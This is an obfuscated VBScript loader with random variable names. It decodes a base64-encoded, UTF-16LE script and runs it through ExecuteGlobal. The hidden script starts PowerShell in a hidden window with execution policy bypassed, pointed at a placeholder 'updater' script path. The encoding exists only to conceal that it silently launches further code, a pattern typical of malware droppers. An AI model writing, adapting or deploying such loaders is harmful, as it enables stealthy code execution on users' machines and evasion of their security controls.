Dim kypcjgdo
kypcjgdo = ""
kypcjgdo = kypcjgdo & "TwBwAHQAaQBvAG4AIABFAHgAcABsAGkAYwBpAHQACgBEAGkAbQAgAG8AUwBoAGUAbA"
kypcjgdo = kypcjgdo & "BsACwAIABzAEMAbQBkAAoAUwBlAHQAIABvAFMAaABlAGwAbAAgAD0AIABDAHIAZQBh"
kypcjgdo = kypcjgdo & "AHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiAC"
kypcjgdo = kypcjgdo & "kACgBzAEMAbQBkACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAA"
kypcjgdo = kypcjgdo & "LQBOAG8AUAByAG8AZgBpAGwAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdg"
kypcjgdo = kypcjgdo & "BlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARQB4"
kypcjgdo = kypcjgdo & "AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABCAHkAcABhAHMAcwAgAC0ARgBpAG"
kypcjgdo = kypcjgdo & "wAZQAgACIAIgAlACUAVQBQAEQAQQBUAEUAUgBfAFAAUwAxAF8AUABBAFQASAAlACUA"
kypcjgdo = kypcjgdo & "IgAiACIACgBvAFMAaABlAGwAbAAuAFIAdQBuACAAcwBDAG0AZAAsACAAMAAsACAAVA"
kypcjgdo = kypcjgdo & "ByAHUAZQAKAFMAZQB0ACAAbwBTAGgAZQBsAGwAIAA9ACAATgBvAHQAaABpAG4AZwA="
Dim egzeqrxj : Set egzeqrxj = CreateObject("ADODB.Stream")
egzeqrxj.Type = 1 : egzeqrxj.Open
Dim gqmrbmtq : Set gqmrbmtq = CreateObject("MSXml2.DOMDocument").createElement("z")
gqmrbmtq.dataType = "bin.base64" : gqmrbmtq.text = kypcjgdo
egzeqrxj.Write gqmrbmtq.nodeTypedValue
egzeqrxj.Position = 0 : egzeqrxj.Type = 2 : egzeqrxj.Charset = "UTF-16LE"
Dim ahcesszg : ahcesszg = egzeqrxj.ReadText : egzeqrxj.Close
ExecuteGlobal ahcesszg